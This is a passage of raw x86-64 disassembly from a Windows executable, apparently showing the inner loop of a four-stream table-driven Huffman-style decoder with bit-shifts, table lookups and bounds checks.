   1400047a6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400047ab:	66 89 02             	mov    %ax,(%rdx)
   1400047ae:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400047b2:	01 44 24 78          	add    %eax,0x78(%rsp)
   1400047b6:	44 0f b6 71 07       	movzbl 0x7(%rcx),%r14d
   1400047bb:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   1400047be:	4c 03 f2             	add    %rdx,%r14
   1400047c1:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   1400047c5:	48 d3 e0             	shl    %cl,%rax
   1400047c8:	41 8b cd             	mov    %r13d,%ecx
   1400047cb:	48 d3 e8             	shr    %cl,%rax
   1400047ce:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400047d2:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400047d7:	66 41 89 00          	mov    %ax,(%r8)
   1400047db:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   1400047df:	0f b6 79 07          	movzbl 0x7(%rcx),%edi
   1400047e3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047e8:	01 45 a0             	add    %eax,-0x60(%rbp)
   1400047eb:	49 03 f8             	add    %r8,%rdi
   1400047ee:	e8 9d ca ff ff       	call   0x140001290
   1400047f3:	85 c0                	test   %eax,%eax
   1400047f5:	75 3a                	jne    0x140004831
   1400047f7:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400047fc:	e8 8f ca ff ff       	call   0x140001290
   140004801:	85 c0                	test   %eax,%eax
   140004803:	75 2c                	jne    0x140004831
   140004805:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000480a:	e8 81 ca ff ff       	call   0x140001290
   14000480f:	85 c0                	test   %eax,%eax
   140004811:	75 1e                	jne    0x140004831
   140004813:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   140004817:	e8 74 ca ff ff       	call   0x140001290
   14000481c:	85 c0                	test   %eax,%eax
   14000481e:	75 11                	jne    0x140004831
   140004820:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004824:	48 83 c0 f9          	add    $0xfffffffffffffff9,%rax
   140004828:	48 3b f8             	cmp    %rax,%rdi
   14000482b:	0f 82 df fc ff ff    	jb     0x140004510
   140004831:	44 8b a5 88 00 00 00 	mov    0x88(%rbp),%r12d
   140004838:	4c 8b 6d d0          	mov    -0x30(%rbp),%r13
   14000483c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140004840:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
   140004844:	49 3b f5             	cmp    %r13,%rsi
   140004847:	77 0b                	ja     0x140004854
   140004849:	4c 3b 7d c0          	cmp    -0x40(%rbp),%r15
   14000484d:	77 05                	ja     0x140004854
   14000484f:	4c 3b f0             	cmp    %rax,%r14
   140004852:	76 0c                	jbe    0x140004860
   140004854:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   14000485b:	e9 da 09 00 00       	jmp    0x14000523a
   140004860:	49 8d 45 f9          	lea    -0x7(%r13),%rax
   140004864:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004869:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000486d:	e8 5e ca ff ff       	call   0x1400012d0
   140004872:	33 c9                	xor    %ecx,%ecx
   140004874:	49 8d 55 f9          	lea    -0x7(%r13),%rdx
   140004878:	85 c0                	test   %eax,%eax
   14000487a:	0f 94 c1             	sete   %cl
   14000487d:	33 c0                	xor    %eax,%eax
   14000487f:	48 3b f2             	cmp    %rdx,%rsi
   140004882:	0f 92 c0             	setb   %al
   140004885:	85 c8                	test   %ecx,%eax
   140004887:	0f 84 11 01 00 00    	je     0x14000499e
   14000488d:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   140004891:	41 8b c4             	mov    %r12d,%eax
   140004894:	f7 d8                	neg    %eax
   140004896:	45 8b ec             	mov    %r12d,%r13d
   140004899:	83 e0 3f             	and    $0x3f,%eax
   14000489c:	41 f7 dd             	neg    %r13d
   14000489f:	41 83 e5 3f          	and    $0x3f,%r13d
   1400048a3:	44 8b e0             	mov    %eax,%r12d
   1400048a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400048ad:	00 00 00 
   1400048b0:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400048b4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400048b9:	48 d3 e0             	shl    %cl,%rax
   1400048bc:	41 8b cc             	mov    %r12d,%ecx
   1400048bf:	48 d3 e8             	shr    %cl,%rax
   1400048c2:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   1400048c6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400048cb:	66 89 06             	mov    %ax,(%rsi)
   1400048ce:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   1400048d2:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400048d6:	44 0f b6 42 07       	movzbl 0x7(%rdx),%r8d
   1400048db:	03 c8                	add    %eax,%ecx
   1400048dd:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400048e2:	4c 03 c6             	add    %rsi,%r8
   1400048e5:	48 d3 e0             	shl    %cl,%rax
   1400048e8:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400048ec:	41 8b cd             	mov    %r13d,%ecx
   1400048ef:	48 d3 e8             	shr    %cl,%rax
   1400048f2:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   1400048f6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400048fb:	66 41 89 00          	mov    %ax,(%r8)
   1400048ff:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004903:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004907:	44 0f b6 4a 07       	movzbl 0x7(%rdx),%r9d
   14000490c:	03 c8                	add    %eax,%ecx
   14000490e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004913:	4d 03 c8             	add    %r8,%r9
   140004916:	48 d3 e0             	shl    %cl,%rax
   140004919:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000491d:	41 8b cd             	mov    %r13d,%ecx
   140004920:	48 d3 e8             	shr    %cl,%rax
   140004923:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004927:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000492c:	66 41 89 01          	mov    %ax,(%r9)
   140004930:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004934:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004938:	0f b6 52 07          	movzbl 0x7(%rdx),%edx
   14000493c:	03 c8                	add    %eax,%ecx
   14000493e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004943:	49 03 d1             	add    %r9,%rdx
   140004946:	48 d3 e0             	shl    %cl,%rax
   140004949:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000494d:	41 8b cd             	mov    %r13d,%ecx
   140004950:	48 d3 e8             	shr    %cl,%rax
   140004953:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004957:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   14000495c:	66 89 02             	mov    %ax,(%rdx)
   14000495f:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004963:	0f b6 71 07          	movzbl 0x7(%rcx),%esi
   140004967:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000496c:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004970:	48 03 f2             	add    %rdx,%rsi
   140004973:	e8 58 c9 ff ff       	call   0x1400012d0
   140004978:	33 c9                	xor    %ecx,%ecx
   14000497a:	85 c0                	test   %eax,%eax
   14000497c:	0f 94 c1             	sete   %cl
   14000497f:	33 c0                	xor    %eax,%eax
   140004981:	48 3b f7             	cmp    %rdi,%rsi
   140004984:	0f 92 c0             	setb   %al
   140004987:	85 c8                	test   %ecx,%eax
   140004989:	0f 85 21 ff ff ff    	jne    0x1400048b0
   14000498f:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
   140004993:	44 8b a5 88 00 00 00 	mov    0x88(%rbp),%r12d
   14000499a:	4c 8b 6d d0          	mov    -0x30(%rbp),%r13
   14000499e:	49 8d 45 fe          	lea    -0x2(%r13),%rax
   1400049a2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400049a7:	48 89 45 78          	mov    %rax,0x78(%rbp)
   1400049ab:	e8 20 c9 ff ff       	call   0x1400012d0
   1400049b0:	33 c9                	xor    %ecx,%ecx
   1400049b2:	49 8d 55 fe          	lea    -0x2(%r13),%rdx
   1400049b6:	85 c0                	test   %eax,%eax
   1400049b8:	0f 94 c1             	sete   %cl
   1400049bb:	33 c0                	xor    %eax,%eax
   1400049bd:	48 3b f2             	cmp    %rdx,%rsi
   1400049c0:	0f 96 c0             	setbe  %al
   1400049c3:	85 c8                	test   %ecx,%eax
   1400049c5:	74 6e                	je     0x140004a35
   1400049c7:	45 8b ec             	mov    %r12d,%r13d
   1400049ca:	4c 8b 65 78          	mov    0x78(%rbp),%r12
   1400049ce:	41 f7 dd             	neg    %r13d
   1400049d1:	41 83 e5 3f          	and    $0x3f,%r13d
   1400049d5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400049dc:	00 00 00 00 
   1400049e0:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400049e4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400049e9:	48 d3 e0             	shl    %cl,%rax
   1400049ec:	41 8b cd             	mov    %r13d,%ecx
   1400049ef:	48 d3 e8             	shr    %cl,%rax
   1400049f2:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   1400049f6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   1400049fb:	66 89 06             	mov    %ax,(%rsi)
   1400049fe:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004a02:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004a06:	0f b6 41 07          	movzbl 0x7(%rcx),%eax
   140004a0a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a0f:	48 03 f0             	add    %rax,%rsi
   140004a12:	e8 b9 c8 ff ff       	call   0x1400012d0
   140004a17:	33 c9                	xor    %ecx,%ecx
   140004a19:	85 c0                	test   %eax,%eax
   140004a1b:	0f 94 c1             	sete   %cl
   140004a1e:	33 c0                	xor    %eax,%eax
   140004a20:	49 3b f4             	cmp    %r12,%rsi
   140004a23:	0f 96 c0             	setbe  %al
   140004a26:	85 c8                	test   %ecx,%eax
   140004a28:	75 b6                	jne    0x1400049e0
   140004a2a:	44 8b a5 88 00 00 00 	mov    0x88(%rbp),%r12d
   140004a31:	4c 8b 6d d0          	mov    -0x30(%rbp),%r13
   140004a35:	8b 54 24 28          	mov    0x28(%rsp),%edx
   140004a39:	4d 8d 4d fe          	lea    -0x2(%r13),%r9
   140004a3d:	49 3b f1             	cmp    %r9,%rsi
   140004a40:	77 48                	ja     0x140004a8a
   140004a42:	45 8b c4             	mov    %r12d,%r8d
   140004a45:	41 f7 d8             	neg    %r8d
   140004a48:	41 83 e0 3f          	and    $0x3f,%r8d
   140004a4c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004a50:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004a55:	83 e2 3f             	and    $0x3f,%edx
   140004a58:	0f b6 ca             	movzbl %dl,%ecx
   140004a5b:	48 d3 e0             	shl    %cl,%rax
   140004a5e:	41 8b c8             	mov    %r8d,%ecx
   140004a61:	48 d3 e8             	shr    %cl,%rax
   140004a64:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004a68:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004a6d:	66 89 06             	mov    %ax,(%rsi)
   140004a70:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004a74:	8b 54 24 28          	mov    0x28(%rsp),%edx
   140004a78:	03 d0                	add    %eax,%edx
   140004a7a:	0f b6 41 07          	movzbl 0x7(%rcx),%eax
   140004a7e:	48 03 f0             	add    %rax,%rsi
   140004a81:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140004a85:	49 3b f1             	cmp    %r9,%rsi
   140004a88:	76 c6                	jbe    0x140004a50
   140004a8a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004a90:	49 3b f5             	cmp    %r13,%rsi
   140004a93:	73 4b                	jae    0x140004ae0
   140004a95:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004a9a:	83 e2 3f             	and    $0x3f,%edx
   140004a9d:	0f b6 ca             	movzbl %dl,%ecx
   140004aa0:	48 d3 e0             	shl    %cl,%rax
   140004aa3:	41 8b cc             	mov    %r12d,%ecx
   140004aa6:	f7 d9                	neg    %ecx
   140004aa8:	48 d3 e8             	shr    %cl,%rax
   140004aab:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004aaf:	0f b6 44 83 04       	movzbl 0x4(%rbx,%rax,4),%eax
   140004ab4:	88 06                	mov    %al,(%rsi)
   140004ab6:	80 7a 07 01          	cmpb   $0x1,0x7(%rdx)
   140004aba:	75 0a                	jne    0x140004ac6
   140004abc:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004ac0:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004ac4:	eb 1a                	jmp    0x140004ae0
   140004ac6:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004aca:	41 3b c8             	cmp    %r8d,%ecx
   140004acd:	73 11                	jae    0x140004ae0
   140004acf:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004ad3:	03 c8                	add    %eax,%ecx
   140004ad5:	41 3b c8             	cmp    %r8d,%ecx
   140004ad8:	41 0f 47 c8          	cmova  %r8d,%ecx
   140004adc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140004ae0:	48 8b 75 c0          	mov    -0x40(%rbp),%rsi
   140004ae4:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004ae9:	48 83 c6 f9          	add    $0xfffffffffffffff9,%rsi
   140004aed:	48 89 75 78          	mov    %rsi,0x78(%rbp)
   140004af1:	e8 da c7 ff ff       	call   0x1400012d0
   140004af6:	33 c9                	xor    %ecx,%ecx
   140004af8:	85 c0                	test   %eax,%eax
   140004afa:	0f 94 c1             	sete   %cl
   140004afd:	33 c0                	xor    %eax,%eax
   140004aff:	4c 3b fe             	cmp    %rsi,%r15
   140004b02:	0f 92 c0             	setb   %al
   140004b05:	85 c8                	test   %ecx,%eax
   140004b07:	0f 84 08 01 00 00    	je     0x140004c15
   140004b0d:	45 8b ec             	mov    %r12d,%r13d
   140004b10:	41 8b f4             	mov    %r12d,%esi
   140004b13:	4c 8b 65 78          	mov    0x78(%rbp),%r12
   140004b17:	41 f7 dd             	neg    %r13d
   140004b1a:	41 83 e5 3f          	and    $0x3f,%r13d
   140004b1e:	f7 de                	neg    %esi
   140004b20:	83 e6 3f             	and    $0x3f,%esi
   140004b23:	0f 1f 40 00          	nopl   0x0(%rax)
   140004b27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004b2e:	00 00 
   140004b30:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004b34:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004b39:	48 d3 e0             	shl    %cl,%rax
   140004b3c:	41 8b cd             	mov    %r13d,%ecx
   140004b3f:	48 d3 e8             	shr    %cl,%rax
   140004b42:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004b46:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004b4b:	66 41 89 07          	mov    %ax,(%r15)
   140004b4f:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004b53:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004b57:	44 0f b6 42 07       	movzbl 0x7(%rdx),%r8d
   140004b5c:	03 c8                	add    %eax,%ecx
   140004b5e:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004b63:	4d 03 c7             	add    %r15,%r8
   140004b66:	48 d3 e0             	shl    %cl,%rax
   140004b69:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004b6d:	8b ce                	mov    %esi,%ecx
   140004b6f:	48 d3 e8             	shr    %cl,%rax
   140004b72:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004b76:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004b7b:	66 41 89 00          	mov    %ax,(%r8)
   140004b7f:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004b83:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004b87:	44 0f b6 4a 07       	movzbl 0x7(%rdx),%r9d
   140004b8c:	03 c8                	add    %eax,%ecx
   140004b8e:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004b93:	4d 03 c8             	add    %r8,%r9
   140004b96:	48 d3 e0             	shl    %cl,%rax
   140004b99:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004b9d:	8b ce                	mov    %esi,%ecx
   140004b9f:	48 d3 e8             	shr    %cl,%rax
   140004ba2:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004ba6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004bab:	66 41 89 01          	mov    %ax,(%r9)
   140004baf:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004bb3:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004bb7:	0f b6 52 07          	movzbl 0x7(%rdx),%edx
   140004bbb:	03 c8                	add    %eax,%ecx
   140004bbd:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004bc2:	49 03 d1             	add    %r9,%rdx
   140004bc5:	48 d3 e0             	shl    %cl,%rax
   140004bc8:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004bcc:	8b ce                	mov    %esi,%ecx
   140004bce:	48 d3 e8             	shr    %cl,%rax
   140004bd1:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004bd5:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004bda:	66 89 02             	mov    %ax,(%rdx)
   140004bdd:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004be1:	44 0f b6 79 07       	movzbl 0x7(%rcx),%r15d
   140004be6:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004beb:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004bef:	4c 03 fa             	add    %rdx,%r15
   140004bf2:	e8 d9 c6 ff ff       	call   0x1400012d0
   140004bf7:	33 c9                	xor    %ecx,%ecx
   140004bf9:	85 c0                	test   %eax,%eax
   140004bfb:	0f 94 c1             	sete   %cl
   140004bfe:	33 c0                	xor    %eax,%eax
   140004c00:	4d 3b fc             	cmp    %r12,%r15
   140004c03:	0f 92 c0             	setb   %al
   140004c06:	85 c8                	test   %ecx,%eax
   140004c08:	0f 85 22 ff ff ff    	jne    0x140004b30
   140004c0e:	44 8b a5 88 00 00 00 	mov    0x88(%rbp),%r12d
   140004c15:	4c 8b 6d c0          	mov    -0x40(%rbp),%r13
   140004c19:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004c1e:	49 83 c5 fe          	add    $0xfffffffffffffffe,%r13
   140004c22:	e8 a9 c6 ff ff       	call   0x1400012d0
   140004c27:	33 c9                	xor    %ecx,%ecx
   140004c29:	85 c0                	test   %eax,%eax
   140004c2b:	0f 94 c1             	sete   %cl
   140004c2e:	33 c0                	xor    %eax,%eax
   140004c30:	4d 3b fd             	cmp    %r13,%r15
   140004c33:	0f 96 c0             	setbe  %al
   140004c36:	85 c8                	test   %ecx,%eax
   140004c38:	74 52                	je     0x140004c8c
   140004c3a:	41 8b f4             	mov    %r12d,%esi
   140004c3d:	f7 de                	neg    %esi
   140004c3f:	83 e6 3f             	and    $0x3f,%esi
   140004c42:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004c46:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004c4b:	48 d3 e0             	shl    %cl,%rax
   140004c4e:	8b ce                	mov    %esi,%ecx
   140004c50:	48 d3 e8             	shr    %cl,%rax
   140004c53:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004c57:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004c5c:	66 41 89 07          	mov    %ax,(%r15)
   140004c60:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004c64:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004c68:	0f b6 41 07          	movzbl 0x7(%rcx),%eax
   140004c6c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004c71:	4c 03 f8             	add    %rax,%r15
   140004c74:	e8 57 c6 ff ff       	call   0x1400012d0
   140004c79:	33 c9                	xor    %ecx,%ecx
   140004c7b:	85 c0                	test   %eax,%eax
   140004c7d:	0f 94 c1             	sete   %cl
   140004c80:	33 c0                	xor    %eax,%eax
   140004c82:	4d 3b fd             	cmp    %r13,%r15
   140004c85:	0f 96 c0             	setbe  %al
   140004c88:	85 c8                	test   %ecx,%eax
   140004c8a:	75 b6                	jne    0x140004c42
   140004c8c:	4c 8b 55 c0          	mov    -0x40(%rbp),%r10
   140004c90:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140004c94:	4d 8d 4a fe          	lea    -0x2(%r10),%r9
   140004c98:	4d 3b f9             	cmp    %r9,%r15
   140004c9b:	77 4e                	ja     0x140004ceb
   140004c9d:	45 8b c4             	mov    %r12d,%r8d
   140004ca0:	41 f7 d8             	neg    %r8d
   140004ca3:	41 83 e0 3f          	and    $0x3f,%r8d
   140004ca7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004cae:	00 00 
   140004cb0:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004cb5:	83 e2 3f             	and    $0x3f,%edx
   140004cb8:	0f b6 ca             	movzbl %dl,%ecx
   140004cbb:	48 d3 e0             	shl    %cl,%rax
   140004cbe:	41 8b c8             	mov    %r8d,%ecx
   140004cc1:	48 d3 e8             	shr    %cl,%rax
   140004cc4:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004cc8:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004ccd:	66 41 89 07          	mov    %ax,(%r15)
   140004cd1:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004cd5:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140004cd9:	03 d0                	add    %eax,%edx
   140004cdb:	0f b6 41 07          	movzbl 0x7(%rcx),%eax
   140004cdf:	4c 03 f8             	add    %rax,%r15
   140004ce2:	89 54 24 50          	mov    %edx,0x50(%rsp)
   140004ce6:	4d 3b f9             	cmp    %r9,%r15
   140004ce9:	76 c5                	jbe    0x140004cb0
   140004ceb:	4d 3b fa             	cmp    %r10,%r15
   140004cee:	73 50                	jae    0x140004d40
   140004cf0:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004cf5:	83 e2 3f             	and    $0x3f,%edx
   140004cf8:	0f b6 ca             	movzbl %dl,%ecx
   140004cfb:	48 d3 e0             	shl    %cl,%rax
   140004cfe:	41 8b cc             	mov    %r12d,%ecx
   140004d01:	f7 d9                	neg    %ecx
   140004d03:	48 d3 e8             	shr    %cl,%rax
   140004d06:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004d0a:	0f b6 44 83 04       	movzbl 0x4(%rbx,%rax,4),%eax
   140004d0f:	41 88 07             	mov    %al,(%r15)
   140004d12:	80 7a 07 01          	cmpb   $0x1,0x7(%rdx)
   140004d16:	75 0a                	jne    0x140004d22
   140004d18:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004d1c:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004d20:	eb 1e                	jmp    0x140004d40
   140004d22:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004d26:	83 f9 40             	cmp    $0x40,%ecx
   140004d29:	73 15                	jae    0x140004d40
   140004d2b:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004d2f:	03 c8                	add    %eax,%ecx
   140004d31:	b8 40 00 00 00       	mov    $0x40,%eax
   140004d36:	83 f9 40             	cmp    $0x40,%ecx
   140004d39:	0f 47 c8             	cmova  %eax,%ecx
   140004d3c:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004d40:	4c 8b 6d c8          	mov    -0x38(%rbp),%r13
   140004d44:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004d49:	49 8d 75 f9          	lea    -0x7(%r13),%rsi
   140004d4d:	48 89 75 78          	mov    %rsi,0x78(%rbp)
   140004d51:	e8 7a c5 ff ff       	call   0x1400012d0
   140004d56:	33 c9                	xor    %ecx,%ecx
   140004d58:	85 c0                	test   %eax,%eax
   140004d5a:	0f 94 c1             	sete   %cl
   140004d5d:	33 c0                	xor    %eax,%eax
   140004d5f:	4c 3b f6             	cmp    %rsi,%r14
   140004d62:	0f 92 c0             	setb   %al
   140004d65:	85 c8                	test   %ecx,%eax
   140004d67:	0f 84 05 01 00 00    	je     0x140004e72
   140004d6d:	4c 8b 6d 78          	mov    0x78(%rbp),%r13
   140004d71:	45 8b fc             	mov    %r12d,%r15d
   140004d74:	41 f7 df             	neg    %r15d
   140004d77:	41 8b f4             	mov    %r12d,%esi
   140004d7a:	41 83 e7 3f          	and    $0x3f,%r15d
   140004d7e:	f7 de                	neg    %esi
   140004d80:	83 e6 3f             	and    $0x3f,%esi
   140004d83:	0f 1f 40 00          	nopl   0x0(%rax)
   140004d87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004d8e:	00 00 
   140004d90:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004d94:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004d99:	48 d3 e0             	shl    %cl,%rax
   140004d9c:	41 8b cf             	mov    %r15d,%ecx
   140004d9f:	48 d3 e8             	shr    %cl,%rax
   140004da2:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004da6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004dab:	66 41 89 06          	mov    %ax,(%r14)
   140004daf:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004db3:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004db7:	44 0f b6 42 07       	movzbl 0x7(%rdx),%r8d
   140004dbc:	03 c8                	add    %eax,%ecx
   140004dbe:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004dc3:	4d 03 c6             	add    %r14,%r8
   140004dc6:	48 d3 e0             	shl    %cl,%rax
   140004dc9:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004dcd:	8b ce                	mov    %esi,%ecx
   140004dcf:	48 d3 e8             	shr    %cl,%rax
   140004dd2:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004dd6:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004ddb:	66 41 89 00          	mov    %ax,(%r8)
   140004ddf:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004de3:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004de7:	44 0f b6 4a 07       	movzbl 0x7(%rdx),%r9d
   140004dec:	03 c8                	add    %eax,%ecx
   140004dee:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004df3:	4d 03 c8             	add    %r8,%r9
   140004df6:	48 d3 e0             	shl    %cl,%rax
   140004df9:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004dfd:	8b ce                	mov    %esi,%ecx
   140004dff:	48 d3 e8             	shr    %cl,%rax
   140004e02:	48 8d 14 83          	lea    (%rbx,%rax,4),%rdx
   140004e06:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004e0b:	66 41 89 01          	mov    %ax,(%r9)
   140004e0f:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   140004e13:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004e17:	0f b6 52 07          	movzbl 0x7(%rdx),%edx
   140004e1b:	03 c8                	add    %eax,%ecx
   140004e1d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004e22:	49 03 d1             	add    %r9,%rdx
   140004e25:	48 d3 e0             	shl    %cl,%rax
   140004e28:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004e2c:	8b ce                	mov    %esi,%ecx
   140004e2e:	48 d3 e8             	shr    %cl,%rax
   140004e31:	48 8d 0c 83          	lea    (%rbx,%rax,4),%rcx
   140004e35:	0f b7 44 83 04       	movzwl 0x4(%rbx,%rax,4),%eax
   140004e3a:	66 89 02             	mov    %ax,(%rdx)
   140004e3d:	0f b6 41 06          	movzbl 0x6(%rcx),%eax
   140004e41:	44 0f b6 71 07       	movzbl 0x7(%rcx),%r14d
   140004e46:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004e4b:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004e4f:	4c 03 f2             	add    %rdx,%r14
   140004e52:	e8 79 c4 ff ff       	call   0x1400012d0
   140004e57:	33 c9                	xor    %ecx,%ecx
   140004e59:	85 c0                	test   %eax,%eax
   140004e5b:	0f 94 c1             	sete   %cl
   140004e5e:	33 c0                	xor    %eax,%eax
   140004e60:	4d 3b f5             	cmp    %r13,%r14
   140004e63:	0f 92 c0             	setb   %al
   140004e66:	85 c8                	test   %ecx,%eax
